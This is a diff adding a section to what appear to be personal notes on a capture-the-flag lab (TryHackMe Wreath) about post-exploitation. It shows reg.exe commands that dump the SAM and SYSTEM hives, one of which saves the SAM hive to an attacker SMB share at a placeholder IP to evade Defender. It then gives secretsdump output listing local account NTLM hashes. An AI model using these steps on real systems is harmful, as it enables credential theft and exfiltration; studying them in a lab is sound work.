@@ -389,5 +389,29 @@ Sddl   : O:BAG:S-1-5-21-3963238053-2357614183-4023578609-513D:AI(A;OICI;FA;;;BU)
          ;;S-1-15-2-2)
 
 
+<h2> Task 44  Exfiltration Exfiltration Techniques & Post Exploitation </h2>
+
+Dumping the SAM hive isn't quite enough though -- we also need the SYSTEM hive which contains the boot key for the machine:
+## reg.exe save HKLM\SYSTEM system.bak
+
+With both Hives dumped, we can exfiltrate them back to our attacking machine to dump the hashes out of sight of Defender.
+
+It's up to you how you choose to exfiltrate the files. Given this is a home network with no monitoring in place, an SMB server is recommended. Connect to your SMB server using your SYSTEM reverse shell with the net use command. You can now either save the files directly to your own drive, or move the files to your attacking machine if you already dumped the hives, e.g:
+
+##reg.exe save HKLM\SAM \\ATTACKING_IP\share\sam.bak
+
+┌──(duke㉿kali)-[~/Documents/THM_Wreath]
+└─$ python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak local
+Impacket v0.10.1.dev1+20220513.140233.fb1e50c1 - Copyright 2022 SecureAuth Corporation
+
+[*] Target system bootKey: 0xfce6f31c003e4157e8cb1bc59f4720e6
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c47252568da284cd2:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06e57bdd6824566d79f127fa0de844e2:::
+Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
+[*] Cleaning up... 
+
 
 </code>
